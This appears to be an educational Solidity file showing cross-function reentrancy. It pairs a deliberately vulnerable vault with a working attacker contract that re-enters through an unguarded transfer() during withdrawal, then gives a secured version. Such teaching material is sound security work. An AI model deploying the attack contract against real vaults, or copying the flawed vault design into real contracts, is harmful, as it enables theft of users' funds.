// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableVault {
    mapping(address => uint256) public balances;
    bool private locked;
    
    modifier noReentrant() {
        require(!locked, "No reentrancy");
        locked = true;
        _;
        locked = false;
    }
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    // Protected with reentrancy guard
    function withdrawAll() external noReentrant {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance");
        
        // External call BEFORE state update
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] = 0; // Too late!
    }
    
    // VULNERABLE: Shares state with withdrawAll but no guard!
    function transfer(address to, uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        balances[msg.sender] -= amount;
        balances[to] += amount;
    }
}

interface IVulnerableVault {
    function deposit() external payable;
    function withdrawAll() external;
    function transfer(address to, uint256 amount) external;
}

contract CrossFunctionAttack {
    IVulnerableVault public vault;
    address public attacker;
    address public accomplice;
    
    constructor(address _vaultAddress) {
        vault = IVulnerableVault(_vaultAddress);
        attacker = address(this);
    }
    
    function setAccomplice(address _accomplice) external {
        accomplice = _accomplice;
    }
    
    function depositToVault() external payable {
        vault.deposit{value: msg.value}();
    }
    
    function attack() external {
        vault.withdrawAll();
    }
    
    // When withdrawAll sends ETH, we reenter via transfer()
    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            // Reenter through DIFFERENT function!
            // Balance hasn't been updated yet in withdrawAll
            vault.transfer(accomplice, 1 ether);
        }
    }
    
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract SecureVault {
    mapping(address => uint256) public balances;
    bool private locked;
    
    modifier noReentrant() {
        require(!locked, "No reentrancy");
        locked = true;
        _;
        locked = false;
    }
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    // Both functions now protected with same guard
    function withdrawAll() external noReentrant {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance");
        
        // State update BEFORE external call
        balances[msg.sender] = 0;
        
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
    }
    
    // Also protected!
    function transfer(address to, uint256 amount) external noReentrant {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        balances[msg.sender] -= amount;
        balances[to] += amount;
    }
}
